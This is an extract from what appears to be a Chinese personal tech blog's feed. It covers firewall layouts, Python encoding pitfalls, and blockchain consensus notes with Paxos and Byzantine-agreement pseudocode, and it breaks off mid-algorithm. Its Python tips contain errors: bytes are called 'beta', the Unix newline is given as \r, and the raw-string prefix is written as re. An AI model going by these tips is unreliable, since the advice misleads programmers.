title="防火墙设置"></a>防火墙设置</h1><p>三种基础防火墙形式：Netfilter (封包过滤机制)，TCP Wrappers (程序控管)，Proxy (代理服务器)<br>三种常见的防火墙布线：</p><h3 id="仅一个防火墙部署在路由器"><a href="#仅一个防火墙部署在路由器" class="headerlink" title="仅一个防火墙部署在路由器"></a>仅一个防火墙部署在路由器</h3><p><img src="/myimages/iptable/firewall_01.png" alt="sdsdsd"></p><h3 id="内部需要保护的网络再多加一个防火墙"><a href="#内部需要保护的网络再多加一个防火墙" class="headerlink" title="内部需要保护的网络再多加一个防火墙"></a>内部需要保护的网络再多加一个防火墙</h3><p><img src="/myimages/iptable/firewall_02.png" alt="image"></p><h3 id="隔离态的网络服务器型防火墙部署（DMZ）"><a href="#隔离态的网络服务器型防火墙部署（DMZ）" class="headerlink" title="隔离态的网络服务器型防火墙部署（DMZ）"></a>隔离态的网络服务器型防火墙部署（DMZ）</h3><p><img src="/myimages/iptable/firewall_03.png" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>python代码纠错琐碎</title>
      <link href="/2018/03/01/python%E4%BB%A3%E7%A0%81%E7%BA%A0%E9%94%99%E7%90%90%E7%A2%8E/"/>
      <url>/2018/03/01/python%E4%BB%A3%E7%A0%81%E7%BA%A0%E9%94%99%E7%90%90%E7%A2%8E/</url>
      
        <content type="html"><![CDATA[<h5 id="1-python3在编码问题中只存在‘beta’和‘string’两种类型的数据流，对于beta类型会在相应的输出中以‘0b’开头表示这是一个beta类型的数据。而对于string类型的化则没有这一个提示。"><a href="#1-python3在编码问题中只存在‘beta’和‘string’两种类型的数据流，对于beta类型会在相应的输出中以‘0b’开头表示这是一个beta类型的数据。而对于string类型的化则没有这一个提示。" class="headerlink" title="1. python3在编码问题中只存在‘beta’和‘string’两种类型的数据流，对于beta类型会在相应的输出中以‘0b’开头表示这是一个beta类型的数据。而对于string类型的化则没有这一个提示。"></a>1. python3在编码问题中只存在‘beta’和‘string’两种类型的数据流，对于beta类型会在相应的输出中以‘0b’开头表示这是一个beta类型的数据。而对于string类型的化则没有这一个提示。</h5><ul><li>注意这里的string并不是侠义上的string（字符串），它表示的是已经编码过的数据类型，包括整数，字符串（这才是狭义上的string），以及bool型等等。而beta则是没有经过任何编码的存二进制流。所以这也是为啥在使用python3中的一些密码库的时候，按python2中的编码会出错的缘故。所以笔者打算搜集整理一下学习生活中所遇到的一些编码上的困惑，以及解决办法。</li></ul><p>1.1 关于base64模块的调用在进行编码的时候必须要先对相应的要加密的字符串进行相应的编码。</p><ul><li>其中的utf-8可以换成其他的编码方式，但是在解密的格式化输出的时候也别忘了进行相对应的解码操作。（python的默认的加密方式为utf-8）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">bytesString = copyright.encode(encoding=&quot;utf-8&quot;)</span><br><span class="line">encodestr = base64.b64encode(bytesString)</span><br><span class="line">encodestr.encode(&quot;utf-8&quot;)#假如不加utf-8也是可以的，因为默认的就是它</span><br></pre></td></tr></table></figure><p>1.2 python对于文本的操作是有默认以unicode的编码方式写入和保存，所以如果是以其他编码方式（如utf-8）对文本写入（除了ascll，因为ascll被很多编码方式作为子集进行融入），但却以默认的unicode的方式打开就会报错。这也是用python以默认打开一些不是Unicode编码的文件会报错的原因了。但是，如果以二进制的操纵形式进行读取，却是可行的，因为python读取二进制是纯二进制脚本，只是读取二进制文件一般对于解决问题意义不大。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">date=<span class="string">"hello_world"</span></span><br><span class="line">open(<span class="string">"test.text"</span>,<span class="string">"w"</span>,encoding=<span class="string">"utf-8"</span>).write(date)</span><br><span class="line">open(<span class="string">"test.text"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="comment">#报错</span></span><br><span class="line">open(<span class="string">"test.text"</span>,<span class="string">"r"</span>,encoding=<span class="string">"utf-8"</span>).read()</span><br><span class="line"><span class="comment">#正常输出</span></span><br><span class="line">open(<span class="string">"test.text"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="comment">#正常输出</span></span><br></pre></td></tr></table></figure></p><p>1.3 windows平台和类unix平台下的换行符是不一样的。</p><p>windows: \r\n</p><p>类unix:  \r</p><p>所以在处理两个跨平台的文本的时候要留意。python的强大之处在于它会根据系统的不同自动的转换两种换行的方式。给我们处理文件带来了方便。python更为伟大的地方在于，如果我们以二进制的方式打开写入文本，它就会自动帮助我们关闭换行转换，以免我们在读取音频和视频的时候出错。</p><h5 id="2-在进行一些类似path的参数设定的时候，例如path-“C-XXX-XXX”之类的话，因为-符号本身就表示转义后一个字符的函数，算是一个python语言的保留字符，就像一些保留变量不能使用一样，这里会造成SyntaxError-unicode-error-‘unicodeescape’-codec-can’t-decode-bytes-in-position-2-3这样的错误。"><a href="#2-在进行一些类似path的参数设定的时候，例如path-“C-XXX-XXX”之类的话，因为-符号本身就表示转义后一个字符的函数，算是一个python语言的保留字符，就像一些保留变量不能使用一样，这里会造成SyntaxError-unicode-error-‘unicodeescape’-codec-can’t-decode-bytes-in-position-2-3这样的错误。" class="headerlink" title="2.在进行一些类似path的参数设定的时候，例如path=“C:\XXX\XXX”之类的话，因为\符号本身就表示转义后一个字符的函数，算是一个python语言的保留字符，就像一些保留变量不能使用一样，这里会造成SyntaxError: (unicode error) ‘unicodeescape’ codec can’t decode bytes in position 2-3这样的错误。"></a>2.在进行一些类似path的参数设定的时候，例如path=“C:\XXX\XXX”之类的话，因为\符号本身就表示转义后一个字符的函数，算是一个python语言的保留字符，就像一些保留变量不能使用一样，这里会造成SyntaxError: (unicode error) ‘unicodeescape’ codec can’t decode bytes in position 2-3这样的错误。</h5><p>解决的方法大致有两种：</p><p>2.1. 类似于正则的转义问题，可以直接加re方可，path=re“C:\XXX\XXX”</p><p>2.2. 把’\’符号都换成’/也可以解决问题、</p><h5 id="3-在使用matplotlib中绘图例如plt-title-plt-xlable之类在展示中出现中文乱码的情况，有以下两种解决方案"><a href="#3-在使用matplotlib中绘图例如plt-title-plt-xlable之类在展示中出现中文乱码的情况，有以下两种解决方案" class="headerlink" title="3.在使用matplotlib中绘图例如plt.title,plt.xlable之类在展示中出现中文乱码的情况，有以下两种解决方案"></a>3.在使用matplotlib中绘图例如plt.title,plt.xlable之类在展示中出现中文乱码的情况，有以下两种解决方案</h5><p> 3.1 在每次写代码前加入以下两行代码 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>]=[<span class="string">'SimHei'</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>]=<span class="keyword">False</span> <span class="comment">#用来正常显示负号</span></span><br></pre></td></tr></table></figure><p>3.2 把系统自带的字导入到matplotlib中去，这是一种比较长期的做法（由于这种方法在本机中测试成功，所以相关方法可以度娘一下）</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>漫步区块链</title>
      <link href="/2018/02/28/%E6%BC%AB%E6%AD%A5%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
      <url>/2018/02/28/%E6%BC%AB%E6%AD%A5%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-0-0-宏观看区块链"><a href="#1-0-0-宏观看区块链" class="headerlink" title="1.0.0 宏观看区块链"></a>1.0.0 宏观看区块链</h1><p>涉及分布式系统的共识，密码学传输加密，去中心化的一种新式的数据结构。建立在现如今大数据背景下分布式存储，以及一系列相对较为成熟的可以解决拜占庭结点问题分布式共识机制下，发展而来的，去中心化，更公开，更公正，也更安全的数据存储技术。<br>区块链作为一个分布式数据存储，传输和分发的解决方案，其核心就是我们上面所说的如何在一个分布式的，无受信结点的环境下，自动达成共识的机制。尽管现在还处于发展萌芽阶段，但是比特币的“红遍大江南北”，使得这个技术逐渐进入人们的视线，引起了一大批研发人员的兴致，预言并参与这个技术革命的浪潮。<br><a id="more"></a></p><h2 id="1-1-0-为什么区块链会广泛的受到关注？"><a href="#1-1-0-为什么区块链会广泛的受到关注？" class="headerlink" title="1.1.0  为什么区块链会广泛的受到关注？"></a>1.1.0  为什么区块链会广泛的受到关注？</h2><p>第一，区块链具有去中心化的特征，不以任何参与方为中心。这点可以和以往的中心化管理的数据库系统进行对比理解。所谓的去中心化，就是没有一个特定的结点去管理整个数据系统，任何一个结点都有对整个数据的备份，在满足协议的以及相关共识条件下，都可以进行对数据的查询或者修改的权利。去中心化的数据库可以带来一定效率的提升和成本的降低，从而提高利润。<br>第二，区块链具有其也许吧热播的特征，也就是假定参与交易的任何一方都是不可信任的，通过共识机制，我们最后可以达成共识。这就很好的回应了互联网的痛点——诚信问题。<br>总的来说就是，其核心特征：去中心化和去信任化，智能合约等特性很好的满足了未来互联网的发展所需要的信息高度自动化和高度程序化的安全流转需求。（以上部分参考了《区块链核心算法解析——推荐序二，推荐序三》）<!--more--></p><h2 id="1-2-0-分布式系统"><a href="#1-2-0-分布式系统" class="headerlink" title="1.2.0 分布式系统"></a>1.2.0 分布式系统</h2><p>所谓的分布式的概念理解其实不难，就是原来一个机器的工作现在分给了很多台机器去共同完成，但是在逻辑上这些机器仍旧对外看来具有“只有一个机器在工作”的效果。这就好比算法里面的分而治之思想，只是这些物理层面上分散的，分布开的工作设备在逻辑上是一个设备，这些“资产”（暂且把这些设备看作一个分布式系统的资产）就组成了一个分布式系统。</p><h3 id="1-2-1-分布式系统的产生"><a href="#1-2-1-分布式系统的产生" class="headerlink" title="1.2.1 分布式系统的产生"></a>1.2.1 分布式系统的产生</h3><p>分布式系统是随着信息产业的发展而演变而来的必然结果，受限于硬件性能优化的逐渐变得困难(即使摩尔定律至今还在有效)，但是人们对数据存储和cpu等硬件的性能需求在大数据时代是飞速的发展，那么为了解决这个问题，分布式系统就自然而然诞生了，并且承担了大数据信息时代的压力。也是分布式系统的逐渐完善，配合其他相关技术的发展，我们的信息化步伐才得以稳步前进。</p><h3 id="1-2-2分布式系统需要解决的一个问题重要问题：如何在存在不可靠的（可控故障），甚至是不可信的（拜占庭结点）结点直接建立共识机制来协调分布式系统的正常工作。"><a href="#1-2-2分布式系统需要解决的一个问题重要问题：如何在存在不可靠的（可控故障），甚至是不可信的（拜占庭结点）结点直接建立共识机制来协调分布式系统的正常工作。" class="headerlink" title="1.2.2分布式系统需要解决的一个问题重要问题：如何在存在不可靠的（可控故障），甚至是不可信的（拜占庭结点）结点直接建立共识机制来协调分布式系统的正常工作。"></a>1.2.2分布式系统需要解决的一个问题重要问题：如何在存在不可靠的（可控故障），甚至是不可信的（拜占庭结点）结点直接建立共识机制来协调分布式系统的正常工作。</h3><p>不可靠结点：结点因物理故障等原因消息传递或者说是节点间通讯延迟或者中断<br>不可信结点：也即拜占庭结点，结点会自发产生不可预见性的行为，其行为异常可以不符合协议的约定（针对这种异常，比较容易通过检测机制察觉出来）。但是也有一些符合协议约定内容的，但是信息是编造的也就是我们平时所说的hacking行为，这种结点需要有特定的算法来达成共识，每个结点具有正确的一致性。  </p><h2 id="1-3-0-达成共识需要满足的三个条件："><a href="#1-3-0-达成共识需要满足的三个条件：" class="headerlink" title="1.3.0 达成共识需要满足的三个条件："></a>1.3.0 达成共识需要满足的三个条件：</h2><h4 id="一致性：所有好的结点（好结点区别于不可靠和不可信结点，是可以按照我们期望的行为去工作的结点）决策值必定相同。"><a href="#一致性：所有好的结点（好结点区别于不可靠和不可信结点，是可以按照我们期望的行为去工作的结点）决策值必定相同。" class="headerlink" title="一致性：所有好的结点（好结点区别于不可靠和不可信结点，是可以按照我们期望的行为去工作的结点）决策值必定相同。"></a>一致性：所有好的结点（好结点区别于不可靠和不可信结点，是可以按照我们期望的行为去工作的结点）决策值必定相同。</h4><h4 id="可终止性：所有的好结点在有限的时间内结束决策过程"><a href="#可终止性：所有的好结点在有限的时间内结束决策过程" class="headerlink" title="可终止性：所有的好结点在有限的时间内结束决策过程"></a>可终止性：所有的好结点在有限的时间内结束决策过程</h4><h4 id="有效性：选择出的值必须是某个节点的输入值"><a href="#有效性：选择出的值必须是某个节点的输入值" class="headerlink" title="有效性：选择出的值必须是某个节点的输入值"></a>有效性：选择出的值必须是某个节点的输入值</h4><h2 id="1-4-0-需要明白的一些原理"><a href="#1-4-0-需要明白的一些原理" class="headerlink" title="1.4.0 需要明白的一些原理"></a>1.4.0 需要明白的一些原理</h2><h5 id="1-4-1-FLP-不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。"><a href="#1-4-1-FLP-不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。" class="headerlink" title="1.4.1 FLP 不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。"></a>1.4.1 FLP 不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。</h5><h5 id="1-4-2-CAP原理：分布式计算系统不可能同时确保一致性（Consistency）、可用性（Availablity）和分区容忍性（Partition），设计中往往需要弱化对某个特性的保证。"><a href="#1-4-2-CAP原理：分布式计算系统不可能同时确保一致性（Consistency）、可用性（Availablity）和分区容忍性（Partition），设计中往往需要弱化对某个特性的保证。" class="headerlink" title="1.4.2 CAP原理：分布式计算系统不可能同时确保一致性（Consistency）、可用性（Availablity）和分区容忍性（Partition），设计中往往需要弱化对某个特性的保证。"></a>1.4.2 CAP原理：分布式计算系统不可能同时确保一致性（Consistency）、可用性（Availablity）和分区容忍性（Partition），设计中往往需要弱化对某个特性的保证。</h5><blockquote><p>一致性（Consistency）：任何操作应该都是原子的，发生在后面的事件能看到前面事件发生导致的结果，注意这里指的是强一致性；  </p><p>可用性（Availablity）：在有限时间内，任何非失败节点都能应答请求；  </p><p>分区容忍性（Partition）：网络可能发生分区，即节点之间的通信不可保障。  </p></blockquote><h5 id="1-4-3-目前主要有几大类共识机制：Pow、Pos、DPos、Pool、PBFT"><a href="#1-4-3-目前主要有几大类共识机制：Pow、Pos、DPos、Pool、PBFT" class="headerlink" title="1.4.3 目前主要有几大类共识机制：Pow、Pos、DPos、Pool、PBFT"></a>1.4.3 目前主要有几大类共识机制：Pow、Pos、DPos、Pool、PBFT</h5><h5 id="1-4-4-有效性"><a href="#1-4-4-有效性" class="headerlink" title="1.4.4 有效性"></a>1.4.4 有效性</h5><p>任何输入有效性：最终的决策值必须是某个节点的输入值<br>正确输入有效性：决策值必须是某个好节点的输入值<br>全部相同有效性：如果所有好结点起始具有相同的输入值v,则决策值也必须是v</p><h2 id="1-5-0-比特币，以太坊和超级账本-hyperledger"><a href="#1-5-0-比特币，以太坊和超级账本-hyperledger" class="headerlink" title="1.5.0 比特币，以太坊和超级账本(hyperledger)"></a>1.5.0 比特币，以太坊和超级账本(hyperledger)</h2><ul><li>区块链的第一代——比特币，比特币是日本中本聪之作，它是区块链的骇世之作，也是目前最为成 熟的的区块链应用之一。<a href="https://github.com/GammaGao/bitcoinwhitepaper/blob/master/bitcoin_cn.pdf" target="_blank" rel="noopener">比特币白皮书  </a></li><li>区块链的第二代——以太坊,以太坊的诞生一定程度上是为了解决比特币的拓展性不足的问题。<a href="https://github.com/ethereum/wiki/wiki/%5B%E4%B8%AD%E6%96%87%5D-%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%99%BD%E7%9A%AE%E4%B9%A6" target="_blank" rel="noopener">以太坊白皮书</a></li><li>区块链的第三代——超级账本，<a href="https://zh.scribd.com/document/350572873/%E8%B6%85%E7%BA%A7%E8%B4%A6%E6%9C%ACHyperledger%E7%99%BD%E7%9A%AE%E4%B9%A6-%E4%B8%AD%E6%96%87%E7%89%88" target="_blank" rel="noopener">超级账本（hyperledger）白皮书</a></li></ul><p><a href="http://blog.csdn.net/u012412689/article/details/73010695" target="_blank" rel="noopener">衍生阅读1：以太坊和hyperledger的比对</a><br><a href="http://note.youdao.com/" target="_blank" rel="noopener">衍生阅读2: thinking in blockchain</a></p><h2 id="1-6-0-10步建立自己的区块链（参考IBM-blockchain1-pdf）"><a href="#1-6-0-10步建立自己的区块链（参考IBM-blockchain1-pdf）" class="headerlink" title="1.6.0 10步建立自己的区块链（参考IBM blockchain1.pdf）"></a>1.6.0 10步建立自己的区块链（参考IBM blockchain1.pdf）</h2><ul><li>区块链技术我的应用是否真的需要</li><li>在我的网络应用中交易行为是否面临这挑战，有哪些挑战</li><li>思考区块链会如何帮助我们应对这些挑战</li><li>Choosing an Appropriate Use Case</li><li>建立一个明确的区块链网络的宏观目标或者规划</li><li>思考区块链的建立始末相关的依赖性问题</li><li>选择一个现如今提供API的区块链项目平台，例如以太坊和超级账本等等</li><li>逐步完善和发展你的区块链代码</li><li>对你的产品进行测试</li><li><p>加入超级账本的交流社区，去里面交流技术，为区块链社区的发展贡献自己的一份力</p><h2 id="1-7-0-核心算法笔记"><a href="#1-7-0-核心算法笔记" class="headerlink" title="1.7.0 核心算法笔记"></a>1.7.0 核心算法笔记</h2></li><li><h3 id="两阶段协议与分布式容错算法Paxos"><a href="#两阶段协议与分布式容错算法Paxos" class="headerlink" title="两阶段协议与分布式容错算法Paxos"></a>两阶段协议与分布式容错算法Paxos</h3><h4 id="两阶段协议"><a href="#两阶段协议" class="headerlink" title="两阶段协议"></a>两阶段协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">阶段1：</span><br><span class="line">客户端像所有的服务器请求锁</span><br><span class="line"></span><br><span class="line">阶段2：</span><br><span class="line">if 如果客户端获得了所有服务的锁 then </span><br><span class="line">    该客户端以可靠的方式向每个服务器发送命令，与此同时释锁</span><br><span class="line">else </span><br><span class="line">    该客户端释放已经获得的锁</span><br><span class="line">    该客户端等待一段时间，重新进入阶段1</span><br><span class="line">end if</span><br></pre></td></tr></table></figure></li></ul><h4 id="朴素的基于票的协议"><a href="#朴素的基于票的协议" class="headerlink" title="朴素的基于票的协议"></a>朴素的基于票的协议</h4><p>票：一种弱化的锁，一个服务器可以发布多个票，即使之前的票还没有释放。而锁的话服务器只能等上一个锁释放后才可以发放下一个。客户端通过票来取得与服务器的联络凭据。同时票具有时效性，也即服务器只认识最新发布的票。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">阶段1：</span><br><span class="line">客户端向所有服务器请求一张票</span><br><span class="line"></span><br><span class="line">阶段2：</span><br><span class="line">if 收到超过半数的服务器回复then </span><br><span class="line">    客户端将获得票与命令一起发送给每个服务器</span><br><span class="line">    服务器检查票的状态，如果票仍然有效（也即最新），则储存命令并给该客户一个积极反馈（该反馈信息作为服务器可执行的通知）</span><br><span class="line">else </span><br><span class="line">    客户端等待，重新进入阶段1</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">阶段3：</span><br><span class="line">if 客户端从过半数的服务处得到了正反馈then </span><br><span class="line">    客户端告诉所有的服务器执行之前的存储的命令</span><br><span class="line">else </span><br><span class="line">    客户端等待，然后重新进入阶段1</span><br><span class="line">end if</span><br></pre></td></tr></table></figure></p><h4 id="Paxos算法"><a href="#Paxos算法" class="headerlink" title="Paxos算法"></a>Paxos算法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">初始化阶段：</span><br><span class="line"></span><br><span class="line">客户端（提案者）：</span><br><span class="line"></span><br><span class="line">c 待执行命令c(commmend)</span><br><span class="line">t=0 当前尝试的票号t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">服务器（接受者）</span><br><span class="line"></span><br><span class="line">T_max=0 当前发布的最大票号代码</span><br><span class="line">C_Memory 当前存储的命令</span><br><span class="line">T_cmemory 用来存储命令c的票</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">阶段1：</span><br><span class="line"></span><br><span class="line">客户端：</span><br><span class="line"></span><br><span class="line">t=t+1</span><br><span class="line">向所有的服务器发送消息，请求得到编号为t的票</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">服务器：</span><br><span class="line">if t &gt; T_max then</span><br><span class="line">    T_max=t</span><br><span class="line">    回复ok(T_cmemory,C_Memeory)</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">阶段2：</span><br><span class="line">客户端：</span><br><span class="line">if 过半数的服务器回复ok then</span><br><span class="line">    选择T_cmemory值最大的ok携带的信息流，也即(T_cmemory,C_Memeory)</span><br><span class="line">    if T_cmemory&gt;0 then</span><br><span class="line">    c=C</span><br><span class="line">    end if </span><br><span class="line">    向这些回复了ok的服务器发送提案：propose(t,c)</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">服务器：</span><br><span class="line">if t =  T_max then </span><br><span class="line">    c=c</span><br><span class="line">    T_cmemory=t </span><br><span class="line">    回复：sucecss</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">阶段3：</span><br><span class="line"></span><br><span class="line">客户端：</span><br><span class="line">if 过半数的服务器回复success then</span><br><span class="line">    向每个服务器发送信息：excute(c)</span><br><span class="line">end if</span><br></pre></td></tr></table></figure><ul><li><h3 id="随机共识机制-bool类型的决策"><a href="#随机共识机制-bool类型的决策" class="headerlink" title="随机共识机制(bool类型的决策)"></a>随机共识机制(bool类型的决策)</h3>因为之前有提到LFP不可能存在一个确定的算法解决一致性问题。所以在公式的达成上面我们的算法一定是不确定的，这就是随机共识机制中“随机”的精妙之处。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">vi=0 or 1</span><br><span class="line">round=1</span><br><span class="line">decided=false</span><br><span class="line">在分布式系统中广播myvalue(vi,round)</span><br><span class="line">while true do</span><br><span class="line">    </span><br><span class="line">    1.提案</span><br><span class="line">    </span><br><span class="line">    持续等待，直到收到过半数当前轮（round）的myvalue消息</span><br><span class="line">    if 所有的消息包含相同的值v then</span><br><span class="line">    广播提议propose(v,round)</span><br><span class="line">    else </span><br><span class="line">    广播propose(本机存储的vi,round)</span><br><span class="line">    end if</span><br><span class="line">    if decided then</span><br><span class="line">    广播myvalue(vi，round+1)</span><br><span class="line">    确定决策之为vi,并且终止算法</span><br><span class="line">    end if </span><br><span class="line">    </span><br><span class="line">    2.调整</span><br><span class="line">    </span><br><span class="line">    持续等待，直到收到超过半数的当前轮（round）的propose消息</span><br><span class="line">    if 所有消息的提案（propose）同样的值v then</span><br><span class="line">        vi=v</span><br><span class="line">        decided=true</span><br><span class="line">    else if 至少一个提案包含v then</span><br><span class="line">        vi=v</span><br><span class="line">    else </span><br><span class="line">        随机等可能的选择本地vi的决策值</span><br><span class="line">    end if </span><br><span class="line">    round=round+1</span><br><span class="line">    广播myalue(vi,round)</span><br><span class="line">end while</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">针对上述算法的改进，在随机选择本地决策值的部分可以采用共享硬币的算法加速决策效率，减少轮数，具体如下：</span><br><span class="line"></span><br><span class="line">以1/n的概率使得本地硬币（或者说是决策）c_x=0,否则c_x=1</span><br><span class="line">结点x广播mycoin（c_x）</span><br><span class="line">等待n-f个硬币的到来，并将他们存储在本地的硬币集合Cx中</span><br><span class="line">广播myset(Cx)</span><br><span class="line">等待n-f个硬币集合（n为结点数，f为最多故障结点数）</span><br><span class="line">if 在这些集合中，至少有一个硬币为0 then</span><br><span class="line">    return 0</span><br><span class="line">else </span><br><span class="line">    return 1</span><br><span class="line">end if</span><br></pre></td></tr></table></figure><ul><li><h3 id="同步-异步模式下的拜占庭协定"><a href="#同步-异步模式下的拜占庭协定" class="headerlink" title="同步,异步模式下的拜占庭协定"></a>同步,异步模式下的拜占庭协定</h3>同步模式下国王算法（King algorithm）（容忍范围：f &lt; n/3 ）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">x=本结点的输入值</span><br><span class="line">for 从第一轮到第f+1个阶段 do</span><br><span class="line">    第一轮</span><br><span class="line">    广播value(x)</span><br><span class="line">    </span><br><span class="line">    第二轮</span><br><span class="line">    if 接收到了value（y）至少n-f次 then</span><br><span class="line">        广播propose(y)</span><br><span class="line">    end if</span><br><span class="line">    if 接收到propose(z)至少f次 then</span><br><span class="line">        x=z</span><br><span class="line">    end if</span><br><span class="line">    </span><br><span class="line">    第三轮：</span><br><span class="line">    设结点vi是预先设定好的第i阶段的国王</span><br><span class="line">    国王vi广播它的当前值w</span><br><span class="line">    if 接收到propose(x)的次数严格少于n-f then</span><br><span class="line">        x=w</span><br><span class="line">    end if</span><br><span class="line">    </span><br><span class="line">end for</span><br></pre></td></tr></table></figure></li></ul><p>异步模式下的拜占庭协定算法（bool型,容忍范围f&lt; n/10）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">xi=(0|1)</span><br><span class="line">r =1  </span><br><span class="line">decided=false</span><br><span class="line">广播propose(xi,r)</span><br><span class="line">repeat </span><br><span class="line">    持续等待，直到接收到n-f条当前轮r的propose 消息，</span><br><span class="line">    if 至少n/2+3f+1 propose 消息包含相同的值x then</span><br><span class="line">        xi=x,decided=true</span><br><span class="line">    else if 至少n/2+f+1 propose 消息包含同样的值x then</span><br><span class="line">        xi=x</span><br><span class="line">    else</span><br><span class="line">        随机选择xi,服从等概率</span><br><span class="line">    end if</span><br><span class="line">    </span><br><span class="line">    r=r+1</span><br><span class="line">    广播propose(xi，r)</span><br><span class="line">until 